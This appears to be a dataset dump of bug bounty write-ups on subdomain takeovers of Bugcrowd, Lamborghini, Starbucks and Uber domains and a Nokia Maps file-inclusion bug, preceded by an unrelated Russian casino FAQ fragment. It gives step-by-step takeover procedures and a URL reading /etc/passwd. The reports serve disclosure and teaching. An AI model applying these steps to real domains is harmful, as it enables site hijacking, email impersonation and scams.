Время зачисления депозита обычно мгновенное, а вывод средств может занять от 1 до 3 рабочих дней. Насколько безопасны игры в онлайн-казино? Безопасность обеспечивается лицензированием, шифрованием данных и честными системами генерации случайных чисел. Игрокам рекомендуется выбирать только лицензированные платформы. Какие бонусы можно получить в украинских онлайн-казино? Бонусы включают приветственные пакеты, бесплатные вращения, кешбэк и программы лояльности. Эти акционные предложения увеличивают шансы на выигрыш. Какие риски связаны с игрой в онлайн-казино? Основные риски — это финансовые потери, игровая зависимость и технические проблемы. Для минимизации рисков важно играть осознанно и придерживаться установленного бюджета. Можно ли играть в украинских казино на мобильных устройствах? Да, большинство онлайн-казино предлагают мобильные приложения или адаптированные версии сайта, что позволяет играть в любое время и в любом месте. Как быстро проходят финансовые транзакции в казино? Депозиты обычно зачисляются мгновенно, а вывод средств может занимать от нескольких часов до 3 рабочих дней в зависимости от метода платежа. Как проверить легальность онлайн-казино в Украине? Убедитесь, что казино имеет лицензию от КРАИЛ (Комиссии по регулированию азартных игр и лотерей). Информация о лицензии должна быть указана на официальном сайте казино. Какие ошибки новички допускают при игре в онлайн-казино? Частые ошибки — игнорирование лицензии, ставка больше установленного бюджета, отсутствие стратегии и эмоциональные решения. Избегайте этих ошибок для улучшения игрового опыта. Copyright © 2025 - all rights reserved by mohamedharon.com Прокрутка вверх"}
{"source_url": "https://blog.securitybreached.org/2017/10/10/bugcrowds-domain-subdomain-takeover-vulnerability", "title": "Bugcrowd’s Domain & Subdomain Takeover vulnerability! - Security Breached Blog", "friendly_explanation": "This is a bug bounty writeup from https://blog.securitybreached.org/2017/10/10/bugcrowds-domain-subdomain-takeover-vulnerability. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nBugcrowd’s Domain & Subdomain Takeover vulnerability! - Security Breached Blog Skip to content Security Breached Blog Hack Smart, Stay Safe: Comprehensive Guides to Cybersecurity and Bug Bounty October 10, 2017 Share BugBounty POC 3 Bugcrowd’s Domain & Subdomain Takeover vulnerability! by MuhammadKhizerJaved H ey, I decided to Write about this Issue because I have seen some people are still confused about “Fastly error: unknown domain” Many Subdomains of BugBounty programs have This error on their Subdomains and People Report is Without Claiming or Try to claim That.. But If you try to claim such Subdoamin it will ask U to add Main domain instead of subdomain… So back to the main story, last Sunday i decided to test Bugcrowd itself as it’s one of most secure BugBounty programs! While i was checking Reverse IP Lookup For bugcrowd.com I got these 2 results Reverse IP Lookup Results — 2 domains hosted on IP address 104.20.60.51 Domain View Whois Record Screenshots 1. bugcrowd.com 2. bugcrowdtrafficcontrol.com As I Frequently Visit bugcrowd.com The other domain bugcrowdtrafficcontrol.com was New for Me as I haven’t seen this domain I decided to Pay a Visit 😛 and I saw an error on the domain! Fastly error: unknown domain: bugcrowdtrafficcontrol.com. Please check that this domain has been added to a service. When I saw the error It suddenly clicks to my mind That I have seen such errors on subdomains of some websites but when I tried to takeover them via Fastly services They ask to add the main domain But in this case It was the main domain. So I checked the WHOis info for this domain and it was! Diagnostics DNS Records for bugcrowdtrafficcontrol.com Hostname Type TTL Priority Content bugcrowdtrafficcontrol.com SOA 1551 edna.ns.cloudflare.com [email protected] 2025379154 10000 2400 604800 3600 bugcrowdtrafficcontrol.com NS 86399 edna.ns.cloudflare.com bugcrowdtrafficcontrol.com NS 86399 lee.ns.cloudflare.com bugcrowdtrafficcontrol.com A 299 104.20.5.239 bugcrowdtrafficcontrol.com A 299 104.20.4.239 bugcrowdtrafficcontrol.com MX 299 5 alt2.aspmx.l.google.com bugcrowdtrafficcontrol.com MX 299 5 alt1.aspmx.l.google.com bugcrowdtrafficcontrol.com MX 299 1 aspmx.l.google.com bugcrowdtrafficcontrol.com MX 299 10 alt4.aspmx.l.google.com bugcrowdtrafficcontrol.com MX 299 10 alt3.aspmx.l.google.com www.bugcrowdtrafficcontrol.com A 299 104.20.60.51 www.bugcrowdtrafficcontrol.com A 299 104.20.61.51 www.bugcrowdtrafficcontrol.com AAAA 299 2400:cb00:2048:1::6814:3c33 www.bugcrowdtrafficcontrol.com AAAA 299 2400:cb00:2048:1::6814:3d33 www.bugcrowdtrafficcontrol.com CNAME 299 www.bugcrowd.com and this Information is Enough for Me to Confirm that the domain was indeed owned by Bugcrowd! TAKEOVER: W ell I opened My Fastly account and tried to make a Service named bugcrowdtrafficcontrol.com & With teh IP of the domain….., And Boom… It says! Your service has been created and activated. Domain 'bugcrowdtrafficcontrol.com' was created 2017-08-13 19:15 +00:00 by khizer Click the following link to see if your site is configured correctly: http://bugcrowdtrafficcontrol.com.global.prod.fastly.net. It may take up to a minute for your site to be ready. So Now as The domain is added to my account i visit the domain again an This time the error was changed to Error 503 hostname doesn't match against certificate hostname doesn't match against certificate Guru Mediation: Details: cache-cdg8721-CDG 1502652983 264973953 Varnish cache server the Error was same to My Fastly service URL http://bugcrowdtrafficcontrol.com.global.prod.fastly.net, The Error was generate due to My mistake… I’m unaware of how to use these services so a little messed Up! But i qucikly figured out that if i add the same service to my cloudfront account and change the Plan to Business (it cost upto 200$ ) You can gain Complete Access of the domain 🙂 Now if You remember the WHOis information showed me another thing The Subdomain www.bugcrowdtrafficcontrol.com When i visited that subdomain and It showed Me an error! Well as soon as i saw this error I remember that some days a go a guys published a Blog about taking over DonaldJTrump’s Website subdomain by same service and i tried to follow his steps But Unfortunately My card was declined while buying the services to Takeover the subdomain …. That’s Why I was Unable to takeover The Subdomain Completely! How to takeover: Signed up as client in Pantheon service. Created a Sandboxed domain as WordPress or Drupal. Added a credit card, then subscribed as ‘Professional’ to setup the sandboxed domain. Used a feature called “custom domains” to add the vulnerable subdomain to my account. Waited for the verification and building process to be finish. Boom You will be the admin of the subdomain So At the end I reported this To Bugcrowd! 😛 Because potentially the domain & Subdomain both was owned by Bugcrowd… Their Reply: The Report was Closed as N/A 😛 lol I was Hoping it to Be closed as Resolved 😛 But I still got 600$ 🙂 Thanks 🙂 Hope it will solve the problem for some about Fastly error 🙂 Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... Related Discover more from Security Breached Blog Subscribe to get the latest posts sent to your email. Type your email… Subscribe Tags: BugBounty POC Subdomain Takeover MuhammadKhizerJaved Dedicated and seasoned cybersecurity professional with over 8 years of active engagement in Bug Bounty Hunting, complemented by 4 years of experience as a Penetration Tester. Skilled in web and mobile application security testing and vulnerability assessment, I am actively involved in platforms like HackerOne and Bugcrowd. My contributions in the Bug Bounty arena have been recognized by over 200 reputable organizations, including Apple, Google, Facebook, The Government of Singapore, and The US Department of Defense. As an advocate for community growth, I actively contribute as a speaker, conducting sessions in local universities and presenting talks at various security conferences, both locally and internationally, including twice at BlackHat MEA, With a passion for growth, Always happy to connect with fellow security practitioners. Share on Facebook Share on X 3 replies on “Bugcrowd’s Domain & Subdomain Takeover vulnerability!” These Bug Bounty Writeups will Change Your Life - PrimeHackers says: July 12, 2020 at 1:16 pm […] Bugcrowd domain subdomain takeover vulnerability […] Loading... Reply Subdomain Takeover Berk İmran - Siber Güvenlik Blog says: January 8, 2019 at 7:51 pm […] https://blog.securitybreached.org/2017/10/10/bugcrowds-domain-subdomain-takeover-vulnerability/ https://blog.securitybreached.org/2017/10/11/what-is-subdomain-takeover-vulnerability/ […] Loading... Reply Neel says: June 8, 2018 at 4:16 pm what tools you used? Loading... Reply Leave a Reply Cancel reply This site uses Akismet to reduce spam. Learn how your comment data is processed. Next Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net Previous Subdomain Takeover Through Expired Cloudfront Distribution | live.lamborghini.com You may also like June 28, 2024 by MuhammadKhizerJaved Finding Hidden Threats: How I Found Leaked AWS Credentials in an Android App API Using DAST Found a critical vulnerability involving leaked AWS credentials within an Android App API during a bug bounty hunt. by utilizing Dynamic Application Security Testing (DAST) and the Mobile Security Framework (MobSF) to uncover the vulnerability. This blog post provides a step-by-step guide for newcomers to set up their own testing environments and utilize MobSF. Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC / Tutorials 0 Read More February 4, 2020 by MuhammadKhizerJaved Exploiting Insecure Firebase Database! Hey guys so this blog post is about Exploiting Insecure Firebase Databases, due to Improper set security rules one can write data to the database in certain conditions here’s a... Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC / Tutorials 6 Read More Security Breached Blog © 2025. All Rights Reserved. Powered by WordPress . Theme by Alx . Loading Comments... Write a Comment... Email (Required) Name (Required) Website %d"}
{"source_url": "https://blog.securitybreached.org/2017/10/10/subdomain-takeover-lamborghini-hacked/", "title": "Subdomain Takeover Through Expired Cloudfront Distribution | live.lamborghini.com - Security Breached Blog", "friendly_explanation": "This is a bug bounty writeup from https://blog.securitybreached.org/2017/10/10/subdomain-takeover-lamborghini-hacked/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSubdomain Takeover Through Expired Cloudfront Distribution | live.lamborghini.com - Security Breached Blog Skip to content Security Breached Blog Hack Smart, Stay Safe: Comprehensive Guides to Cybersecurity and Bug Bounty October 10, 2017 Share BugBounty POC 11 Subdomain Takeover Through Expired Cloudfront Distribution | live.lamborghini.com by MuhammadKhizerJaved Hey Guys! So I have to accept that I’m a Huge Fan of Lamborghini Cars 👊 So I was just looking at their website lamborghini.com when I decided to scan subdomains of the website 😛 and I found a Subdomain ( live.lamborghini.com) that was showing an error Like Cloudfront Error on live.lamborghini.com So as i Know and I hope most of You guys can recognize the ERROR^ so to be sure about the Subdomain Takeover Issue I checked the subdomain Both on http & https If u find the error on Both Then the subdomain is Probably Vulnerable to Subdomain Takeover Vulnerability! So let me start from basics What Basically is Subdomain Takeover Vulnerability? A subdomain takeover is considered a high severity threat and boils down to the registration of a domain by somebody else (with bad intentions) in order to gain control over one or more (sub)domains. This presents an interesting attack vector, which can even lead to several high severity risks, like authentication bypass etc. How it Works? A service named ‘Work’ on your website which located at work.mysite.com hosted at third party like bitbucket, AWS Cloudfront or Heroku and the CNAME Points at this url mysiteasset2015.heroku.com , and this service is not used on heroku , you just decided to use it and it expired or you did not claim it before but you added a dns entry pointing to heroku , so an attacker can claim it , then when you visit assets.mysite.com you are redirected to attacker site on heroku or show Mac Content by the attacker. So Back to the Story after confirming the Error on Both Http/Https i loged In to AWS account and Created a Bucket Named live.lamborghini.com and Uploaded an index.html file on it. Bucket Now After that I visited Cloudfront Distribution options and created a New Cloudfront Distribution I chooses the WEB option and In CNAME i added the link to the subdomain live.lamborghini.com Next i simple Linked my Distribution to my S3 bucket and tadaaa, Your Subdomain is Now Mine 😛 What can be the RISK of this Vulnerability! Somebody can make a Scam page and Scam users for BTC or any other instance on behalf of Lamborghini as its on the official website! I contacted Lamborghini Company about the issue As Soon as I got it & They act fastly to resolve the issue 🙂 Thanks for Reading! Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... Related Discover more from Security Breached Blog Subscribe to get the latest posts sent to your email. Type your email… Subscribe Tags: BugBounty POC Subdomain Takeover MuhammadKhizerJaved Dedicated and seasoned cybersecurity professional with over 8 years of active engagement in Bug Bounty Hunting, complemented by 4 years of experience as a Penetration Tester. Skilled in web and mobile application security testing and vulnerability assessment, I am actively involved in platforms like HackerOne and Bugcrowd. My contributions in the Bug Bounty arena have been recognized by over 200 reputable organizations, including Apple, Google, Facebook, The Government of Singapore, and The US Department of Defense. As an advocate for community growth, I actively contribute as a speaker, conducting sessions in local universities and presenting talks at various security conferences, both locally and internationally, including twice at BlackHat MEA, With a passion for growth, Always happy to connect with fellow security practitioners. Share on Facebook Share on X 11 replies on “Subdomain Takeover Through Expired Cloudfront Distribution | live.lamborghini.com” Top 6 Subdomain Takeover attacks on Uber, Lamborghini, USA.gov | FireCompass says: September 7, 2021 at 11:20 am […] Subdomain Takeover Through Expired Cloudfront Distribution | live.lamborghini.com. To Read More … Click here […] Loading... Reply Getting Started in Bug Bounty Hunting | Complete Guide says: August 30, 2019 at 11:19 am […] Lamborghini Subdomain Takeover Through Expired Cloudfront Distribution Muhammad Khizer Javed […] Loading... Reply Guide 001 |Getting Started in Bug Bounty Hunting.. – Muhammad Khizer Javed says: June 3, 2019 at 3:45 am […] Lamborghini Subdomain Takeover Through Expired Cloudfront Distribution by Muhammad Khizer Javed […] Loading... Reply Hide khan says: March 24, 2019 at 2:39 pm that method still work ?? Loading... Reply hide khan says: March 24, 2019 at 2:34 pm bro now still that method work….??? i mean cloudfront subdomain takeover possible???? Loading... Reply Muhammad Khizer Javed says: April 4, 2019 at 1:22 pm No not anymore Loading... Reply Malik Shoaib says: January 2, 2019 at 3:51 pm Did u recieved a bounty ? Loading... Reply Muhammad Khizer Javed says: January 2, 2019 at 4:00 pm Nop Loading... Reply Top 6 Subdomain Takeover Attacks On Uber, Lamborghini, USA.gov - FireShadows says: August 21, 2018 at 10:05 am […] Subdomain Takeover Through Expired Cloudfront Distribution | live.lamborghini.com. To Read More … Click here […] Loading... Reply Yusuf says: May 28, 2018 at 7:09 pm Amazing catch Bro Loading... Reply What is Subdomain Hijack/Takeover Vulnerability? How to Identify? & Exploit It? - Security Breached Blog says: October 11, 2017 at 9:48 am […] BlogPost related to This https://blog.securitybreached.org/2017/10/10/subdomain-takeover-lamborghini-hacked/ […] Loading... Reply Leave a Reply Cancel reply This site uses Akismet to reduce spam. Learn how your comment data is processed. Next Bugcrowd’s Domain & Subdomain Takeover vulnerability! Previous SQLi & XSS Vulnerabilities in a Popular Airlines Website! You may also like September 10, 2018 by MuhammadKhizerJaved Authentication Bypass Using SQL Injection AutoTrader Webmail – Bug Bounty POC Hey guys Me again with a Short POC about Login Bypass Using SQL Injection to get Access to AutoTraders Webmail so lets begain the POC will be short. What happened... Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC 3 Read More December 10, 2017 by HOW I WAS ABLE TO TAKEOVER FACEBOOK ACCOUNT | Bug Bounty Poc hey all here is ameer hamza, Facebook has recently introduced login with phone functionality if you have forgotten your password. however I was able to exploit it which leads to access... Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC 3 Read More Security Breached Blog © 2025. All Rights Reserved. Powered by WordPress . Theme by Alx . Loading Comments... Write a Comment... Email (Required) Name (Required) Website %d"}
{"source_url": "https://0xpatrik.com/subdomain-takeover-starbucks/", "title": "Subdomain Takeover: Starbucks points to Azure", "friendly_explanation": "This is a bug bounty writeup from https://0xpatrik.com/subdomain-takeover-starbucks/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSubdomain Takeover: Starbucks points to Azure Patrik Hudak Subdomain Takeover: Starbucks points to Azure This post is the write-up about bug bounty report that I reported back in March 2018 to Starbucks. The report is now disclosed, and I was awarded $2,000 bounty. Although I have written about subdomain takeover in multiple posts , this case was somehow different. The domain in question was svcgatewayus.starbucks.com . The domain pointed to a non-existing resource in Microsoft Azure . I realized that I have never talked about Microsoft Azure as a potential vector for subdomain takeover. Firstly, Azure provides multiple services. I look for two primary services: Azure Websites — .azurewebsites.net Cloud Apps — .cloudapp.net The most significant difference compared to CloudFront and other similar services are, that Azure provides dedicated IP address to both of these services. The provided subdomain that points to it using A record. In other words, Azure doesn't utilize virtual hosts setup (as I described previously ). This means that for potential subdomain takeover, you only need to look for DNS status being NXDOMAIN . There are lots of misconceptions about when the subdomain takeover for Azure is possible. I recommend running a simple dig command: dig -t A DOMAIN_TO_CHECK Is the response status NXDOMAIN ? If yes, great, the takeover might be possible. Note that receiving 404 HTTP error does not mean the subdomain takeover is possible at all! As I said before, the services have dedicated VPS. For successful subdomain takeover, DNS request should always return NXDOMAIN . The subdomain in the report pointed to 1fd05821-7501-40de-9e44-17235e7ab48b.cloudapp.net . I needed to create a PoC which was a little bit tricky. The rough guideline of how I did it follows: Created a new Cloud Service in the portal . It asks for a custom domain name. Remember: This domain name needs to match since you are not dealing with virtual host anymore. You can confirm this theory by noticing that Cloud Service never asks for a domain name which you will use for CNAME . Created a Storage Account for the Cloud Service in the Azure portal. Azure requires a specific format for deployment of Cloud Services which is generated by Visual Studio. I created a simple ASP.NET web application and uploaded it to this Cloud Service using this tutorial. Because of DNS, the A record for svcgatewayus.starbucks.com is pointing to Azure, and so the HTTP request returns the content from the ASP.NET application I just deployed. For Azure Websites, the process is much more straightforward and looks closer to traditional PaaS. To create PoC for Azure Websites, I recommend the following this tutorial. I tested that, and it works correctly. I have to say that I find the Azure portal very messy. IMHO it is a lot more complex than AWS with no significant benefits. Azure offers several other services with a different structure, subdomains, and PoC process that I will cover in one of the future posts. Follow me on Twitter to get it first. Until next time! Patrik Follow @0xpatrik Patrik Hudak — Subdomain Takeover: Starbucks points to Azure Share this"}
{"source_url": "https://0xpatrik.com/subdomain-takeover-starbucks-ii/", "title": "Subdomain Takeover: Yet another Starbucks case", "friendly_explanation": "This is a bug bounty writeup from https://0xpatrik.com/subdomain-takeover-starbucks-ii/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSubdomain Takeover: Yet another Starbucks case Patrik Hudak Subdomain Takeover: Yet another Starbucks case Recently, I was repeatedly awarded $2,000 bounty for subdomain takeover on Starbucks . You may remember my post about bug bounty report where I described how to subdomain takeover was possible using Azure. This case was pretty similar. However, I had to use another Azure service called Traffic Manager . In this post, I explain the step-by-step process for the proof of concept. On Monday evening, I noticed that wfmnarptpc.starbucks.com responds with NXDOMAIN . The more interesting fact was that it has CNAME set to s00149tmppcrpt.trafficmanager.net . From experience, I knew that this has a perfect chance of being a subdomain takeover. As you may remember, Azure mostly uses dedicated IP addresses, so when CNAME to Azure responds with NXDOMAIN , your bug bounty radar should be on. Previously, I haven't mentioned that trafficmanager.net is also one of the domains where subdomain takeover is possible. Let's look at what is Traffic Manager about: \"Microsoft Azure Traffic Manager allows you to control the distribution of user traffic for service endpoints in different datacenters. [...] You can also use Traffic Manager with external, non-Azure endpoints.\" $ dig a wfmnarptpc.starbucks.com ; <<>> DiG 9.10.6 <<>> a wfmnarptpc.starbucks.com ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 20251 ;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ;; QUESTION SECTION: ;wfmnarptpc.starbucks.com. IN A ;; ANSWER SECTION: wfmnarptpc.starbucks.com. 33165 IN CNAME s00149tmppcrpt.trafficmanager.net. Simply put, there is some domain which has link to non-existing subdomain of trafficmanager.net . To prove our point, we need to registered the previously removed asset in Azure. Thankfully (for us), Azure is not doing any domain ownership verification :-) You may remember that this situation is still not the winning point since there might be disabled configuration with this subdomain in Azure. In this case, even though externally it seems that takeover is possible, PoC creation would fail. I started by creating a new Traffic Manager profile in the Azure portal: Nice! At this point, I knew that the subdomain takeover is possible. The s00149tmppcrpt.trafficmanager.net is available; I can take it and progress with PoC. Now I needed to point the domain to one of the servers that I own: The only thing left was to create a new virtual host on my endpoint: Time well spent. Thank you very much. Until next time! Patrik Follow @0xpatrik Patrik Hudak — Subdomain Takeover: Yet another Starbucks case Share this"}
{"source_url": "http://blog.shashank.co/2013/10/lfi-in-nokia-maps.html", "title": "Shashank's Security Blog: LFI in Nokia maps", "friendly_explanation": "This is a bug bounty writeup from http://blog.shashank.co/2013/10/lfi-in-nokia-maps.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nShashank's Security Blog: LFI in Nokia maps Shashank's Security Blog Finding security bugs for food. Home Home Need my service? Tuesday, 22 October 2013 LFI in Nokia maps Well, this is my first blog-post, and I am going to share a Local File inclusion bug which I spotted in Nokia maps. http://maps.nokia.com/services/file:///etc/passwd reported on 2nd JAN 2013 Nokia fixes it on 20th JAN 2013 And I received an awesome RED NOKIA LUMIA 920 :) Posted by Shashank at 17:37 Email This BlogThis! Share to X Share to Facebook Share to Pinterest No comments: Post a Comment Newer Post Home Subscribe to: Post Comments (Atom) Follow Me Follow @cyberboyIndia Blog Archive ► 2020 (3) ► November (1) ► August (1) ► July (1) ► 2019 (2) ► May (1) ► March (1) ► 2018 (3) ► March (1) ► February (1) ► January (1) ► 2017 (3) ► November (2) ► October (1) ► 2015 (2) ► October (1) ► March (1) ► 2014 (1) ► January (1) ▼ 2013 (7) ► December (4) ► November (1) ▼ October (2) Nokia email app pwnage LFI in Nokia maps Popular Posts Writing a silent cryptocurrency miner (Monero) in 6 lines of code Hidden Crypto currency mining has always been a game for blackhat hackers to make money out of it. After reading a lot of blog and news abo... From a 500 error to Django admin takeover This bug is about a private target I was hunting. I passed all the subdomains to FFUF , a great tool written in GoLang to brute force direct... CRLF injection in blockchain.info This bug was reported by me to \"Blockchain.info\" for their bug-bounty program. For those who don't know about blockchain.in... Oracle xss Every one knows about ORACLE. Oracle Corporation is an American multinational computer technology corporation headquartered in Redwood City... Heroku Directory Transversal Long back I spotted a Directory Traversal bug in Heroku. \"Heroku is a cloud platform is a cloud application platform – a new way of ... How Apollo Hospitals leaked 1 million customer details About Apollo Hospitals:- In 2015, Apollo Hospitals introduced its digital platform, Ask Apollo. The platform provides remote healthcare s... Stealing bitcoin wallet backups from blockchain.info Oauth, where many bugs arise :) This was one of my finding for the bug-bounty program of blockchain.info, where I was able to steal anyo... Taking Over Publicly Editable Github Wiki in Masses Let's get familiar with a few things first! What is Github? GitHub is a web-based hosting service for version control using Git. Git... LFI in Nokia maps Well, this is my first blog-post, and I am going to share a Local File inclusion bug which I spotted in Nokia maps. http://maps.nokia.com... Escalating a GitHub leak to takeover entire organization I was hunting on a private program. One of the common things I do is look for leaked credentials on Github. I give special attention to dele... Cyberboy. Awesome Inc. theme. Powered by Blogger ."}
{"source_url": "https://blog.securitybreached.org/2017/11/20/uber-wildcard-subdomain-takeover", "title": "UBER Wildcard Subdomain Takeover | BugBounty POC", "friendly_explanation": "This is a bug bounty writeup from https://blog.securitybreached.org/2017/11/20/uber-wildcard-subdomain-takeover. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nUBER Wildcard Subdomain Takeover | BugBounty POC Skip to content Security Breached Blog Hack Smart, Stay Safe: Comprehensive Guides to Cybersecurity and Bug Bounty November 20, 2017 Share BugBounty POC 10 UBER Wildcard Subdomain Takeover | BugBounty POC by MuhammadKhizerJaved H i All, So Last month i decided to test Uber for Fun & Profit, So while scanning for subdomains to target i found a subdomain “ design.uber.com ” While navigating to the subdomain it redirected me to another domain Owned By Uber That was https://www.uber.design/ so The domain was new for me as i haven’t seen that before that domain is a static website so i was not sure what issues i can find on that. i decided to scan for its subdomains also, so i setup the script with my custom subdomain wordlist, and as soon as the script started it started showing me off the subdomains that was in my list (for example my list started from www,blog,beta1,beta2,dev2 etc) well it was strange as my wordlist contains 6000 words to test for subdomains and it was showing that all of the subdomains are available, i decided to check these subdomains manually the subdomain i tested was “ www.mobile.uber.design ” and showed me an Error & the subdomain was resolving to *.herokudns.com Well most of us know that sometimes this error can lead to subdomain takeover ( read about subdomain takeover here ) so I logged in to my Heroku account and created an app named “ Ubertst ” and Then after that i added the subdomain www.mobile.uber.design to my domain list and after that the the Error on subdomain was gone and it was changed to That’s all i do and i have taken over one subdomain of uber. For Further Impact identification @uranium238 Gave some ideas related to Google G-suite verification, As You know Google Gsuite need to verify a domain before giving access to the app and an attacker can send an receive emails as Uber using *.uber.design subdomains By simply following these steps. Steps: 1) Register a domain as admin.uber.design 2) Create a Google G-suite account as [email protected] 3) verify the domain by Uploading HTML to domain via Github 4) After verification i’m able to send and receive emails as [email protected] also As The Domain is Owned by the attacker he can further use if for any miscellaneous purposes, he can add a site on google sites and can also b used as a Scam site. Well after that, I reported the issue to Uber. but after reporting i turned to the other subdomains and only one subdomain www.uber.design was legit and all Other subdomain were vulnerable to takeover, Basically as heroku wildcard is Opened and i can register any subdomain. Thanks For reading 🙂 Program: https://hackerone.com/uber Report: https://hackerone.com/reports/275337 status: Resolved Bounty: A bit low!! Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... Related Discover more from Security Breached Blog Subscribe to get the latest posts sent to your email. Type your email… Subscribe Tags: BugBounty POC Subdomain Takeover MuhammadKhizerJaved Dedicated and seasoned cybersecurity professional with over 8 years of active engagement in Bug Bounty Hunting, complemented by 4 years of experience as a Penetration Tester. Skilled in web and mobile application security testing and vulnerability assessment, I am actively involved in platforms like HackerOne and Bugcrowd. My contributions in the Bug Bounty arena have been recognized by over 200 reputable organizations, including Apple, Google, Facebook, The Government of Singapore, and The US Department of Defense. As an advocate for community growth, I actively contribute as a speaker, conducting sessions in local universities and presenting talks at various security conferences, both locally and internationally, including twice at BlackHat MEA, With a passion for growth, Always happy to connect with fellow security practitioners. Share on Facebook Share on X 10 replies on “UBER Wildcard Subdomain Takeover | BugBounty POC” These Bug Bounty Writeups will Change Your Life - PrimeHackers says: June 26, 2020 at 7:31 am […] Uber wildcard subdomain takeover […] Loading... Reply Getting Started in Bug Bounty Hunting | Complete Guide says: August 30, 2019 at 11:16 am […] UBER Wildcard Subdomain Takeover Muhammad Khizer Javed […] Loading... Reply Guide 001 |Getting Started in Bug Bounty Hunting.. – Muhammad Khizer Javed says: June 3, 2019 at 3:45 am […] UBER Wildcard Subdomain Takeover by Muhammad Khizer Javed […] Loading... Reply Muhammad Umer Siddiqui says: November 21, 2017 at 12:21 pm Nice Deface Page 😀 Loading... Reply babayaga47 says: November 21, 2017 at 4:38 pm hahaha Thanks 🙂 Loading... Reply Abdillah says: November 21, 2017 at 4:48 am Share the subdomain wordlist 😀 Loading... Reply babayaga47 says: November 21, 2017 at 4:38 pm writing a Post about recon will include in that 🙂 Loading... Reply Ankit says: November 20, 2017 at 7:51 pm leets Loading... Reply babayaga47 says: November 21, 2017 at 4:38 pm O.o? Loading... Reply sleepy says: November 20, 2017 at 7:40 pm bro , can u please share script u have used ? Loading... Reply Leave a Reply Cancel reply This site uses Akismet to reduce spam. Learn how your comment data is processed. Next My Guide to Basic Recon? | Bug Bounties + Recon | Amazing Love story. Previous Accessing Localhost via Vhost | VIRTUAL HOST ENUMERATION | BugBounty POC You may also like December 19, 2017 by MuhammadKhizerJaved Unrestricted File Upload to RCE | Bug Bounty POC Hey Guys, Hope all of you guys are doing well, I’m an Active Bug Bounty participant, & also sometimes work as a Freelancer for some extra pocket money :p So... Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC 4 Read More May 18, 2018 by MuhammadKhizerJaved How I was able to get subscription of $120/year For Free | Bug Bounty POC About 2 Months ago a friend gave me his wetransfer.com account to send a 15GB file to a friend as he was using WeTransfer Plus subscription that he bought for... Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC 8 Read More Security Breached Blog © 2025. All Rights Reserved. Powered by WordPress . Theme by Alx . Loading Comments... Write a Comment... Email (Required) Name (Required) Website %d"}
